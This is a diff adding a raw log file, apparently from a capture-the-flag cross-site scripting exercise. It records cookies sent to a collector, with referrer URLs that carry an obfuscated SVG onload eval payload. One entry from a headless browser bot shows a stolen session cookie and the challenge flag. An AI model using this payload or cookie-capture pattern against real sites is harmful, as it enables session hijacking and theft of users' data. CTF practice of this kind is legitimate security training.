@@ -1,0 +1,36 @@
+username=Null Byte
+
+_xsrf=2|ed516e49|509ff0e488cc8cf619974d8f204fa244|1571303664; username=Null Byte
+
+_xsrf=2|ed516e49|509ff0e488cc8cf619974d8f204fa244|1571303664; username=Null Byte
+
+ document.cookie
+
+username=Null Byte
+
+
+
+username=put that cookie down! NOW!
+
+
+
+
+
+
+
+
+
+
+
+IP: 140.112.73.133 | PORT: 52853 | HOST:  |  Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | METHOD:  | REF: https://edu-ctf.kaibro.tw:30678/hackme.php?q=%3CSVG%2FONLoAD%3Deval%28n%26%2397%3Bm%5Cu%7B65%7D%29%3E |  DATE: Monday 11th 2019f November 2019 04:25:38 AM | COOKIE:  cookie=_ga=GA1.2.1004783461.1568723904;%20_gid=GA1.2.1209157637.1573392666;%20PHPSESSID=98h6kv6jk3snvhiiq6lhh28sv7 
+
+IP: 140.112.73.133 | PORT: 53238 | HOST:  |  Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | METHOD:  | REF: https://edu-ctf.kaibro.tw:30678/hackme.php?q=%3CSVG%2FONLoAD%3Deval%28n%26%2397%3Bm%5Cu%7B65%7D%29%3E |  DATE: Monday 11th 2019f November 2019 04:28:18 AM | COOKIE:  cookie=_ga=GA1.2.1004783461.1568723904;%20_gid=GA1.2.1209157637.1573392666;%20PHPSESSID=98h6kv6jk3snvhiiq6lhh28sv7 
+
+IP: 140.112.73.133 | PORT: 53404 | HOST:  |  Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | METHOD:  | REF: https://edu-ctf.kaibro.tw:30678/ |  DATE: Monday 11th 2019f November 2019 04:29:27 AM | COOKIE:  cookie= 
+
+IP: 140.112.73.133 | PORT: 53441 | HOST:  |  Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | METHOD:  | REF: https://edu-ctf.kaibro.tw:30678/ |  DATE: Monday 11th 2019f November 2019 04:29:43 AM | COOKIE:  cookie= 
+
+IP: 140.112.73.133 | PORT: 53519 | HOST:  |  Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | METHOD:  | REF: https://edu-ctf.kaibro.tw:30678/hackme.php?q=%3CSVG%2FONLoAD%3Deval%28n%26%2397%3Bm%5Cu%7B65%7D%29%3E |  DATE: Monday 11th 2019f November 2019 04:30:25 AM | COOKIE:  cookie=_ga=GA1.2.1004783461.1568723904;%20_gid=GA1.2.1209157637.1573392666;%20PHPSESSID=98h6kv6jk3snvhiiq6lhh28sv7 
+
+IP: 54.238.163.34 | PORT: 53651 | HOST:  |  Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/77.0.3865.90 HeadlessChrome/77.0.3865.90 Safari/537.36 | METHOD:  | REF: https://edu-ctf.kaibro.tw:30678/hackme.php?q=%3CSVG%2FONLoAD%3Deval%28n%26%2397%3Bm%5Cu%7B65%7D%29%3E |  DATE: Monday 11th 2019f November 2019 04:31:17 AM | COOKIE:  cookie=flag=FLAG%7Bbabyxss_easy_peasy_yo%7D 
+
